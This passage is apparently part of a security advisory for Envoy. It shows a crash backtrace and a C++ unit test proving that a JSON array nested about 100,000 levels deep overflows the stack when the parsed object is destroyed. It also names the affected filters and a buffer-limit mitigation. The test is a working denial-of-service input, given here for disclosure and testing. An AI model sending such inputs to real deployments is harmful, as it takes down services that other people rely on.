[2026-04-29 13:46:21.536][16][critical][backtrace] [./source/server/backtrace.h:113] Backtrace (use tools/stack_decode.py to get line numbers):
[2026-04-29 13:46:21.536][16][critical][backtrace] [./source/server/backtrace.h:114] Envoy version: 0/1.39.0-dev/test/DEBUG/BoringSSL
[2026-04-29 13:46:21.542][16][critical][backtrace] [./source/server/backtrace.h:121] #0: Envoy::SignalAction::sigHandler() [0x55890f07ce7c]
[2026-04-29 13:46:21.542][16][critical][backtrace] [./source/server/backtrace.h:123] #1: [0x7f3a3a8f0df0]
[2026-04-29 13:46:21.547][16][critical][backtrace] [./source/server/backtrace.h:121] #2: Envoy::Json::Nlohmann::(anonymous namespace)::Field::~Field() [0x55890ef82a5b]
[2026-04-29 13:46:21.552][16][critical][backtrace] [./source/server/backtrace.h:121] #3: Envoy::Json::Nlohmann::(anonymous namespace)::Field::~Field() [0x55890ef82a89]
...
[2026-04-29 13:46:21.614][16][critical][backtrace] [./source/server/backtrace.h:121] #16: Envoy::Json::Nlohmann::(anonymous namespace)::Field::~Field() [0x55890ef82a5b]
[2026-04-29 13:46:21.614][16][critical][backtrace] [./source/server/backtrace.h:121] #17: Envoy::Json::Nlohmann::(anonymous namespace)::Field::~Field() [0x55890ef82a89]
```

### PoC
Unit test reproducing the above stacktrace in test/common/json

```
TEST_F(JsonLoaderTest, DeeplyNestedJsonDestructorStackOverflow) {
  // Construct a deeply nested JSON string.
  // ~100-200KB of [[[...]]] is reported to cause a crash.
  // Let's use 100,000 nesting levels to be safe.
  const int depth = 100000;
  std::string json;
  json.reserve(depth * 2 + 10);
  for (int i = 0; i < depth; ++i) {
    json.push_back('[');
  }
  for (int i = 0; i < depth; ++i) {
    json.push_back(']');
  }
  // Parse the JSON string.
  // The parser itself is claimed to be iterative, so it should succeed.
  // The crash happens during destruction of the resulting object graph.
  {
    auto status_or_object = Factory::loadFromString(json);
    EXPECT_TRUE(status_or_object.ok());
  } // Object goes out of scope here, triggering destruction and expected crash.
}
```

### Impact
Any filter using the loadFromString method on the hot path is affected. This includes but is not limited to:
McpRouter
JsonToMetadata filter.

Note that impact can be mitigated by setting lower buffer limits, thereby not allowing `'['*100K + ']'*100K`. 

### Gen AI Usage
This vulnerability was discovered by Claude Mythos and reproduced by Gemini.
